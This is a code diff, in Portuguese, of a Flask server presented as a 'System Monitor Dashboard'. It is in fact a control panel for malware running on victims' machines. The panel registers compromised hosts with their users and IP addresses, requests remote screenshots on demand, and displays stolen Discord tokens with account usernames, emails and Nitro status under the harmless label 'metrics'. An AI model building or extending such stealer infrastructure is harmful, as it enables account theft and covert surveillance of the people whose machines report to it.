@@ -1,27 +1,15 @@
 #!/usr/bin/env python3
 """
-System Monitor Dashboard - Servidor com Logs de Erro
+System Monitor Dashboard - Versão Completa Final
 """
 
 import os
 import json
 import base64
-import traceback
 from datetime import datetime
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
-
-# LOGS DE DEBUG ATIVADOS
-DEBUG_MODE = True
-
-def log_debug(msg, error=None):
-    """Função de log detalhada"""
-    timestamp = datetime.now().strftime('%H:%M:%S')
-    print(f"[{timestamp}] {msg}")
-    if error:
-        print(f"[{timestamp}] ERRO: {str(error)}")
-        print(f"[{timestamp}] TRACEBACK: {traceback.format_exc()}")
 
 # CORS manual
 @app.after_request
@@ -39,22 +27,16 @@ screenshot_requests = {}
 
 @app.route('/')
 def index():
-    log_debug("Acesso ao painel principal")
     return HTML_TEMPLATE
 
 @app.route('/api/register', methods=['POST', 'OPTIONS'])
 def register_endpoint():
-    log_debug(f"REQUISIÇÃO REGISTER: {request.method}")
-    
     if request.method == 'OPTIONS':
         return jsonify({'status': 'success'})
     
     try:
         data = request.json
         endpoint_id = data.get('endpoint_id', 'unknown')
-        
-        log_debug(f"Registrando endpoint: {endpoint_id}")
-        log_debug(f"Dados recebidos: {json.dumps(data, indent=2)}")
         
         endpoints[endpoint_id] = {
             'id': endpoint_id,
@@ -69,16 +51,13 @@ def register_endpoint():
             'last_seen': datetime.now().strftime('%H:%M:%S')
         }
         
-        log_debug(f"✅ Endpoint registrado com sucesso: {endpoint_id}")
+        print(f"✅ Endpoint registrado: {endpoint_id}")
         return jsonify({'status': 'success', 'message': 'Endpoint registered'})
     except Exception as e:
-        log_debug(f"❌ ERRO ao registrar endpoint", e)
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/screenshot', methods=['POST', 'OPTIONS'])
 def receive_screenshot():
-    log_debug(f"REQUISIÇÃO SCREENSHOT: {request.method}")
-    
     if request.method == 'OPTIONS':
         return jsonify({'status': 'success'})
     
@@ -87,48 +66,34 @@ def receive_screenshot():
         endpoint_id = data.get('endpoint_id', 'unknown')
         image_base64 = data.get('image', '')
         
-        log_debug(f"Recebendo screenshot de: {endpoint_id}")
-        log_debug(f"Tamanho da imagem: {len(image_base64)} caracteres base64")
-        
         if image_base64:
             endpoint_screenshots[endpoint_id] = {
                 'image': image_base64,
                 'timestamp': datetime.now().isoformat()
             }
-            log_debug(f"✅ Screenshot SALVO para {endpoint_id}")
-            log_debug(f"Total de screenshots: {len(endpoint_screenshots)}")
-        else:
-            log_debug(f"⚠️ Screenshot VAZIO recebido de {endpoint_id}")
+            print(f"📸 Screenshot recebido de {endpoint_id}!")
         
         return jsonify({'status': 'success'})
     except Exception as e:
-        log_debug(f"❌ ERRO ao receber screenshot", e)
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/request_screenshot/<endpoint_id>', methods=['POST', 'OPTIONS'])
 def request_screenshot(endpoint_id):
-    log_debug(f"REQUISIÇÃO REQUEST_SCREENSHOT: {request.method} para {endpoint_id}")
-    
     if request.method == 'OPTIONS':
         return jsonify({'status': 'success'})
     
     try:
-        log_debug(f"Marcando solicitação para: {endpoint_id}")
-        
         screenshot_requests[endpoint_id] = {
             'requested': True,
             'timestamp': datetime.now().isoformat()
         }
         
-        log_debug(f"✅ Screenshot SOLICITADO para: {endpoint_id}")
-        log_debug(f"Solicitações ativas: {list(screenshot_requests.keys())}")
-        
+        print(f"📸 Screenshot solicitado para: {endpoint_id}")
         return jsonify({
             'status': 'success', 
             'message': f'Screenshot solicitado para {endpoint_id}'
         })
     except Exception as e:
-        log_debug(f"❌ ERRO ao solicitar screenshot", e)
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/screenshot_requests/<endpoint_id>', methods=['GET', 'OPTIONS'])
@@ -138,86 +103,75 @@ def check_screenshot_request(endpoint_id):
     
     try:
         request_data = screenshot_requests.get(endpoint_id, {})
-        has_request = request_data.get('requested', False)
-        
-        if DEBUG_MODE and has_request:
-            log_debug(f"🔍 Verificação: {endpoint_id} tem solicitação ATIVA")
-        
         return jsonify({
-            'request_screenshot': has_request,
+            'request_screenshot': request_data.get('requested', False),
             'timestamp': request_data.get('timestamp')
         })
     except Exception as e:
-        log_debug(f"❌ ERRO ao verificar solicitação", e)
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/screenshot_requests/<endpoint_id>/clear', methods=['POST', 'OPTIONS'])
 def clear_screenshot_request(endpoint_id):
-    log_debug(f"REQUISIÇÃO CLEAR: {request.method} para {endpoint_id}")
-    
     if request.method == 'OPTIONS':
         return jsonify({'status': 'success'})
     
     try:
         if endpoint_id in screenshot_requests:
             del screenshot_requests[endpoint_id]
-            log_debug(f"🧹 Solicitação LIMPA para: {endpoint_id}")
-        else:
-            log_debug(f"⚠️ Nenhuma solicitação para limpar: {endpoint_id}")
-        
+            print(f"🧹 Solicitação limpa para: {endpoint_id}")
         return jsonify({'status': 'success'})
     except Exception as e:
-        log_debug(f"❌ ERRO ao limpar solicitação", e)
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/endpoints', methods=['GET', 'OPTIONS'])
 def get_endpoints():
     if request.method == 'OPTIONS':
         return jsonify({'status': 'success'})
-    
-    try:
-        log_debug(f"Listando {len(endpoints)} endpoints")
-        return jsonify(list(endpoints.values()))
-    except Exception as e:
-        log_debug(f"❌ ERRO ao listar endpoints", e)
-        return jsonify({'error': str(e)}), 500
+    return jsonify(list(endpoints.values()))
+
+@app.route('/api/metrics', methods=['GET', 'OPTIONS'])
+def get_metrics():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    return jsonify(metrics_data)
 
 @app.route('/api/screenshot/<endpoint_id>', methods=['GET', 'OPTIONS'])
 def get_screenshot(endpoint_id):
     if request.method == 'OPTIONS':
         return jsonify({'status': 'success'})
     
-    try:
-        log_debug(f"Buscando screenshot de: {endpoint_id}")
-        
-        if endpoint_id in endpoint_screenshots:
-            log_debug(f"✅ Screenshot ENCONTRADO para {endpoint_id}")
-            return jsonify({
-                'image': endpoint_screenshots[endpoint_id]['image'],
-                'timestamp': endpoint_screenshots[endpoint_id]['timestamp']
-            })
-        else:
-            log_debug(f"❌ Screenshot NÃO ENCONTRADO para {endpoint_id}")
-            log_debug(f"Screenshots disponíveis: {list(endpoint_screenshots.keys())}")
-            return jsonify({'error': 'No screenshot available'}), 404
-    except Exception as e:
-        log_debug(f"❌ ERRO ao buscar screenshot", e)
-        return jsonify({'error': str(e)}), 500
+    if endpoint_id in endpoint_screenshots:
+        return jsonify({
+            'image': endpoint_screenshots[endpoint_id]['image'],
+            'timestamp': endpoint_screenshots[endpoint_id]['timestamp']
+        })
+    return jsonify({'error': 'No screenshot available'}), 404
 
 @app.route('/api/stats', methods=['GET', 'OPTIONS'])
 def get_stats():
     if request.method == 'OPTIONS':
         return jsonify({'status': 'success'})
     
+    return jsonify({
+        'total_endpoints': len(endpoints),
+        'online_endpoints': sum(1 for e in endpoints.values() if e.get('status') == 'online'),
+        'total_metrics': len(metrics_data),
+        'total_screenshots': len(endpoint_screenshots),
+        'last_update': datetime.now().strftime('%H:%M:%S')
+    })
+
+@app.route('/api/all_data', methods=['GET', 'OPTIONS'])
+def get_all_data():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
     try:
         return jsonify({
-            'total_endpoints': len(endpoints),
-            'online_endpoints': sum(1 for e in endpoints.values() if e.get('status') == 'online'),
-            'total_screenshots': len(endpoint_screenshots),
-            'last_update': datetime.now().strftime('%H:%M:%S')
+            'endpoints': list(endpoints.values()),
+            'metrics': metrics_data,
+            'screenshots': endpoint_screenshots
         })
     except Exception as e:
-        log_debug(f"❌ ERRO ao buscar stats", e)
         return jsonify({'error': str(e)}), 500
 
 HTML_TEMPLATE = '''<!DOCTYPE html>
@@ -225,7 +179,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Monitor Dashboard</title>
+    <title>System Monitor Dashboard - Completo</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -369,6 +323,122 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        .card {
+            background: rgba(17, 17, 27, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(124, 58, 237, 0.15);
+            border-radius: 16px;
+            padding: 24px;
+            transition: all 0.3s ease;
+        }
+        .card:hover {
+            border-color: rgba(124, 58, 237, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+        }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        .card-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #f3f4f6;
+        }
+        .status-badge {
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .status-badge.online {
+            background: rgba(34, 197, 94, 0.15);
+            color: #22c55e;
+            border: 1px solid rgba(34, 197, 94, 0.3);
+        }
+        .card-info {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+        .info-item {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .info-label {
+            font-size: 0.75rem;
+            color: #6b7280;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .info-value {
+            font-size: 0.9rem;
+            color: #d1d5db;
+            font-weight: 500;
+        }
+        .token-card {
+            background: rgba(17, 17, 27, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(124, 58, 237, 0.15);
+            border-left: 3px solid #a855f7;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.3s ease;
+        }
+        .token-card:hover {
+            border-color: rgba(168, 85, 247, 0.4);
+            transform: translateX(4px);
+        }
+        .token-value {
+            font-size: 0.85rem;
+            color: #a855f7;
+            word-break: break-all;
+            margin-bottom: 10px;
+        }
+        .token-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            color: #6b7280;
+        }
+        .token-valid {
+            color: #22c55e;
+        }
+        .screenshot-btn {
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
+            margin-bottom: 20px;
+        }
+        .screenshot-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
+        }
+        .screenshot-btn:disabled {
+            background: #4b5563;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
         .screen-section {
             background: rgba(17, 17, 27, 0.6);
             backdrop-filter: blur(10px);
@@ -391,34 +461,13 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             border-radius: 12px;
             color: #e0e0e0;
             font-size: 0.95rem;
+            margin-bottom: 24px;
             cursor: pointer;
             outline: none;
         }
         .screen-select:focus {
             border-color: #a855f7;
             box-shadow: 0 0 20px rgba(168, 85, 247, 0.2);
-        }
-        .screenshot-btn {
-            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
-        }
-        .screenshot-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
-        }
-        .screenshot-btn:disabled {
-            background: #4b5563;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
         }
         .screen-display {
             background: rgba(10, 10, 15, 0.9);
@@ -474,31 +523,108 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             padding-left: 12px;
             border-left: 3px solid #a855f7;
         }
-        .error-log {
-            background: rgba(239, 68, 68, 0.1);
-            border: 1px solid rgba(239, 68, 68, 0.3);
-            border-radius: 8px;
-            padding: 15px;
-            margin-top: 20px;
-            color: #ef4444;
-            font-family: monospace;
-            font-size: 0.8rem;
-            max-height: 200px;
-            overflow-y: auto;
-            display: none;
+        .data-section {
+            background: rgba(17, 17, 27, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(124, 58, 237, 0.15);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 20px;
         }
-        .debug-btn {
-            background: rgba(124, 58, 237, 0.2);
-            color: #a855f7;
+        .data-container {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .screenshot-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .screenshot-item {
+            background: rgba(10, 10, 15, 0.8);
             border: 1px solid rgba(124, 58, 237, 0.3);
-            padding: 8px 16px;
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        .screenshot-item:hover {
+            border-color: rgba(168, 85, 247, 0.5);
+            transform: translateY(-2px);
+        }
+        .screenshot-img {
+            width: 100%;
+            max-height: 200px;
             border-radius: 8px;
-            cursor: pointer;
-            font-size: 0.8rem;
-            margin-top: 10px;
+            margin-bottom: 12px;
+            object-fit: cover;
+        }
+        .screenshot-info {
+            font-size: 0.85rem;
+            color: #9ca3af;
+        }
+        .screenshot-time {
+            color: #6b7280;
+            font-size: 0.75rem;
+            margin-top: 8px;
+        }
+        .data-card {
+            background: rgba(17, 17, 27, 0.4);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            transition: all 0.3s ease;
+        }
+        .data-card:hover {
+            border-color: rgba(168, 85, 247, 0.4);
+            background: rgba(17, 17, 27, 0.6);
+        }
+        .data-card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
+        }
+        .data-card-title {
+            font-weight: 600;
+            color: #f3f4f6;
+        }
+        .data-card-status {
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+        .status-online {
+            background: rgba(34, 197, 94, 0.2);
+            color: #22c55e;
+        }
+        .data-card-content {
+            font-size: 0.9rem;
+            color: #d1d5db;
+            line-height: 1.5;
+        }
+        .data-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.1);
+        }
+        .data-label {
+            color: #9ca3af;
+            font-weight: 500;
+        }
+        .data-value {
+            color: #f3f4f6;
+            font-weight: 600;
         }
         @media (max-width: 768px) {
             .stats-grid { grid-template-columns: 1fr; }
+            .cards-grid { grid-template-columns: 1fr; }
             .header h1 { font-size: 2rem; }
         }
     </style>
@@ -508,7 +634,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
     <div class="container">
         <div class="header">
             <h1>System Monitor Dashboard</h1>
-            <p>Com Logs de Debug</p>
+            <p>Monitoramento Completo</p>
             <div class="update-time">
                 <button class="refresh-btn" onclick="location.reload()">Atualizar</button>
                 <span id="updateTime">--:--:--</span>
@@ -524,18 +650,33 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 <div class="stat-label">Online</div>
             </div>
             <div class="stat-card">
+                <div class="stat-value" id="totalMetrics">0</div>
+                <div class="stat-label">Metricas</div>
+            </div>
+            <div class="stat-card">
                 <div class="stat-value" id="totalScreenshots">0</div>
                 <div class="stat-label">Screenshots</div>
             </div>
-            <div class="stat-card">
-                <div class="stat-value" id="lastUpdate">--</div>
-                <div class="stat-label">Última Atualização</div>
-            </div>
         </div>
         <div class="tabs-container">
-            <button class="tab active" onclick="showTab('remote')">Acesso Remoto</button>
+            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
+            <button class="tab" onclick="showTab('metrics')">Metricas</button>
+            <button class="tab" onclick="showTab('remote')">Acesso Remoto</button>
+            <button class="tab" onclick="showTab('data')">Ver Dados</button>
         </div>
-        <div id="remote" class="tab-content active">
+        <div id="endpoints" class="tab-content active">
+            <h2 class="section-title">Endpoints Monitorados</h2>
+            <div class="cards-grid" id="endpointsList">
+                <div class="empty-state">Carregando...</div>
+            </div>
+        </div>
+        <div id="metrics" class="tab-content">
+            <h2 class="section-title">Metricas de Autenticacao</h2>
+            <div id="metricsList">
+                <div class="empty-state">Carregando...</div>
+            </div>
+        </div>
+        <div id="remote" class="tab-content">
             <h2 class="section-title">Screenshot Manual</h2>
             <div class="screen-section">
                 <div class="screen-controls">
@@ -549,8 +690,33 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 <div class="screen-display" id="screenContent">
                     <div class="empty-state">Selecione um endpoint para visualizar</div>
                 </div>
-                <button class="debug-btn" onclick="toggleDebug()">Mostrar/Esconder Logs de Erro</button>
-                <div class="error-log" id="errorLog"></div>
+            </div>
+        </div>
+        <div id="data" class="tab-content">
+            <h2 class="section-title">Todos os Dados Capturados</h2>
+            <div style="margin-bottom: 30px;">
+                <button class="refresh-btn" onclick="loadAllData()">🔄 Atualizar Dados</button>
+            </div>
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
+                <div class="data-section">
+                    <h3 style="color: #a855f7; margin-bottom: 20px; font-size: 1.3rem;">🖥️ Endpoints Conectados</h3>
+                    <div id="dataEndpoints" class="data-container">
+                        <div class="empty-state">Carregando...</div>
+                    </div>
+                </div>
+                <div class="data-section">
+                    <h3 style="color: #a855f7; margin-bottom: 20px; font-size: 1.3rem;">🔑 Tokens Discord</h3>
+                    <div id="dataMetrics" class="data-container">
+                        <div class="empty-state">Carregando...</div>
+                    </div>
+                </div>
+            </div>
+            <div class="data-section" style="margin-top: 30px;">
+                <h3 style="color: #a855f7; margin-bottom: 20px; font-size: 1.3rem;">📸 Screenshots Capturados</h3>
+                <div id="dataScreenshots" class="screenshot-grid">
+                    <div class="empty-state">Nenhum screenshot capturado ainda</div>
+                </div>
             </div>
         </div>
     </div>
@@ -559,7 +725,6 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         const ctx = canvas.getContext('2d');
         let particles = [];
         let currentEndpoint = null;
-        let errorMessages = [];
         
         function resizeCanvas() {
             canvas.width = window.innerWidth;
@@ -638,46 +803,78 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
         }
         
-        function addErrorLog(msg) {
-            errorMessages.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
-            const errorLog = document.getElementById('errorLog');
-            errorLog.innerHTML = errorMessages.join('<br>');
-            errorLog.scrollTop = errorLog.scrollHeight;
-        }
-        
-        function toggleDebug() {
-            const errorLog = document.getElementById('errorLog');
-            errorLog.style.display = errorLog.style.display === 'block' ? 'none' : 'block';
-        }
-        
         async function loadStats() {
             try {
                 const res = await fetch('/api/stats');
                 const data = await res.json();
                 document.getElementById('totalEndpoints').textContent = data.total_endpoints || 0;
                 document.getElementById('onlineEndpoints').textContent = data.online_endpoints || 0;
+                document.getElementById('totalMetrics').textContent = data.total_metrics || 0;
                 document.getElementById('totalScreenshots').textContent = data.total_screenshots || 0;
-                document.getElementById('lastUpdate').textContent = data.last_update || '--';
-            } catch(e) {
-                addErrorLog('Erro ao carregar stats: ' + e.message);
-            }
+            } catch(e) {}
         }
         
         async function loadEndpoints() {
             try {
                 const res = await fetch('/api/endpoints');
                 const endpoints = await res.json();
+                const container = document.getElementById('endpointsList');
                 const select = document.getElementById('endpointSelect');
                 
+                if (endpoints.length === 0) {
+                    container.innerHTML = '<div class="empty-state">Nenhum endpoint conectado</div>';
+                    return;
+                }
+                
                 let selectHtml = '<option value="">Selecione um endpoint...</option>';
-                endpoints.forEach(e => {
+                container.innerHTML = endpoints.map(e => {
                     selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
-                });
+                    return `
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="card-title">${e.hostname}</span>
+                            <span class="status-badge ${e.status}">${e.status}</span>
+                        </div>
+                        <div class="card-info">
+                            <div class="info-item"><span class="info-label">Usuario</span><span class="info-value">${e.user}</span></div>
+                            <div class="info-item"><span class="info-label">IP Local</span><span class="info-value">${e.ip_address}</span></div>
+                            <div class="info-item"><span class="info-label">IP Externo</span><span class="info-value">${e.external_ip}</span></div>
+                            <div class="info-item"><span class="info-label">Plataforma</span><span class="info-value">${e.platform}</span></div>
+                            <div class="info-item"><span class="info-label">RAM</span><span class="info-value">${e.ram}</span></div>
+                            <div class="info-item"><span class="info-label">Ultimo Acesso</span><span class="info-value">${e.last_seen}</span></div>
+                        </div>
+                    </div>`;
+                }).join('');
                 
                 select.innerHTML = selectHtml;
-            } catch(e) {
-                addErrorLog('Erro ao carregar endpoints: ' + e.message);
-            }
+            } catch(e) {}
+        }
+        
+        async function loadMetrics() {
+            try {
+                const res = await fetch('/api/metrics');
+                const metrics = await res.json();
+                const container = document.getElementById('metricsList');
+                
+                if (metrics.length === 0) {
+                    container.innerHTML = '<div class="empty-state">Nenhuma metrica recebida</div>';
+                    return;
+                }
+                
+                container.innerHTML = metrics.map(m => {
+                    const acc = m.account || {};
+                    const accInfo = acc.username ? `${acc.username} | ${acc.email || 'sem email'} ${acc.premium_type ? '| Nitro' : ''}` : 'Token invalido';
+                    return `
+                    <div class="token-card">
+                        <div class="token-value">${m.token}</div>
+                        <div class="token-meta">
+                            <span>${m.endpoint_id} | ${m.source}</span>
+                            <span class="${m.valid ? 'token-valid' : ''}">${m.valid ? 'Valido' : 'Invalido'}</span>
+                        </div>
+                        <div style="margin-top: 8px; color: #22c55e; font-size: 0.8rem;">${accInfo}</div>
+                    </div>`;
+                }).join('');
+            } catch(e) {}
         }
         
         async function selectEndpoint() {
@@ -692,9 +889,6 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             
             screenshotBtn.disabled = false;
             currentEndpoint = endpointId;
-            addErrorLog('Endpoint selecionado: ' + endpointId);
-            
-            // Verifica se já tem screenshot
             await loadScreen();
         }
         
@@ -705,7 +899,6 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             const btn = document.getElementById('screenshotBtn');
             btn.disabled = true;
             btn.textContent = '📸 Capturando...';
-            addErrorLog('Solicitando screenshot para: ' + endpointId);
             
             try {
                 const res = await fetch(`/api/request_screenshot/${endpointId}`, {
@@ -714,38 +907,26 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 });
                 const data = await res.json();
                 
-                addErrorLog('Resposta do servidor: ' + JSON.stringify(data));
-                
                 if (data.status === 'success') {
                     document.getElementById('screenContent').innerHTML = `
                         <div style="color: #22c55e; margin-bottom: 20px;">✅ Screenshot solicitado! Aguarde...</div>
                         <div class="live-indicator"><span class="live-dot"></span><span>PROCESSANDO</span></div>
                     `;
                     
-                    // Verifica a cada 1 segundo por 20 segundos
                     let attempts = 0;
                     const checkInterval = setInterval(async () => {
                         attempts++;
-                        addErrorLog('Tentativa ' + attempts + ' de buscar screenshot...');
                         await loadScreen();
                         
                         if (attempts >= 20 || document.querySelector('.screen-image')) {
                             clearInterval(checkInterval);
                             btn.disabled = false;
                             btn.textContent = '📸 Capturar Screenshot';
-                            if (!document.querySelector('.screen-image')) {
-                                addErrorLog('❌ Screenshot não encontrado após 20 tentativas');
-                            }
                         }
                     }, 1000);
-                } else {
-                    throw new Error(data.message || 'Erro ao solicitar screenshot');
                 }
             } catch (error) {
-                addErrorLog('❌ Erro na requisição: ' + error.message);
-                document.getElementById('screenContent').innerHTML = `
-                    <div style="color: #ef4444;">❌ Erro: ${error.message}</div>
-                `;
+                document.getElementById('screenContent').innerHTML = `<div style="color: #ef4444;">❌ Erro: ${error.message}</div>`;
                 btn.disabled = false;
                 btn.textContent = '📸 Capturar Screenshot';
             }
@@ -756,36 +937,69 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             if (!endpointId) return;
             
             try {
-                addErrorLog('Buscando screenshot de: ' + endpointId);
                 const res = await fetch(`/api/screenshot/${endpointId}`);
                 const data = await res.json();
-                
                 if (data.image) {
-                    addErrorLog('✅ Screenshot encontrado! Tamanho: ' + data.image.length + ' caracteres');
                     document.getElementById('screenContent').innerHTML = `
                         <div class="live-indicator"><span class="live-dot"></span><span>LIVE</span></div>
                         <img class="screen-image" src="data:image/png;base64,${data.image}" alt="Visualizacao remota">
-                        <div style="margin-top: 10px; color: #6b7280; font-size: 0.8rem;">
-                            Capturado em: ${new Date(data.timestamp).toLocaleString()}
-                        </div>
                     `;
-                } else {
-                    addErrorLog('⚠️ Screenshot não encontrado ainda');
                 }
-            } catch(e) {
-                addErrorLog('❌ Erro ao buscar screenshot: ' + e.message);
-            }
+            } catch(e) {}
+        }
+        
+        async function loadAllData() {
+            try {
+                const res = await fetch('/api/all_data');
+                const data = await res.json();
+                
+                // Endpoints
+                const endpointsContainer = document.getElementById('dataEndpoints');
+                if (data.endpoints.length === 0) {
+                    endpointsContainer.innerHTML = '<div class="empty-state">Nenhum endpoint conectado</div>';
+                } else {
+                    endpointsContainer.innerHTML = data.endpoints.map(e => `
+                        <div class="data-card">
+                            <div class="data-card-header">
+                                <span class="data-card-title">${e.hostname}</span>
+                                <span class="data-card-status status-online">${e.status}</span>
+                            </div>
+                            <div class="data-card-content">
+                                <div class="data-item"><span class="data-label">Usuário:</span><span class="data-value">${e.user}</span></div>
+                                <div class="data-item"><span class="data-label">IP:</span><span class="data-value">${e.external_ip}</span></div>
+                                <div class="data-item"><span class="data-label">Sistema:</span><span class="data-value">${e.platform}</span></div>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+                
+                // Screenshots
+                const screenshotsContainer = document.getElementById('dataScreenshots');
+                const screenshots = Object.entries(data.screenshots || {});
+                if (screenshots.length === 0) {
+                    screenshotsContainer.innerHTML = '<div class="empty-state">Nenhum screenshot capturado ainda</div>';
+                } else {
+                    screenshotsContainer.innerHTML = screenshots.map(([id, s]) => `
+                        <div class="screenshot-item">
+                            <img class="screenshot-img" src="data:image/png;base64,${s.image}" alt="Screenshot">
+                            <div class="screenshot-info">${id}</div>
+                            <div class="screenshot-time">${new Date(s.timestamp).toLocaleString()}</div>
+                        </div>
+                    `).join('');
+                }
+            } catch(e) {}
         }
         
         // Inicialização
         loadStats();
         loadEndpoints();
+        loadMetrics();
         updateTime();
         
-        // Atualiza a cada 5 segundos
         setInterval(() => {
             loadStats();
             loadEndpoints();
+            loadMetrics();
             updateTime();
         }, 5000);
     </script>
@@ -795,7 +1009,5 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    log_debug(f"🚀 Servidor com LOGS iniciando na porta {port}")
-    log_debug(f"🌐 URL: http://localhost:{port}")
-    log_debug("📸 Modo DEBUG ativado - todos os erros serão logados")
-    app.run(host='0.0.0.0', port=port, debug=True)
+    print(f"🚀 Servidor Completo Final iniciando na porta {port}")
+    app.run(host='0.0.0.0', port=port, debug=False)
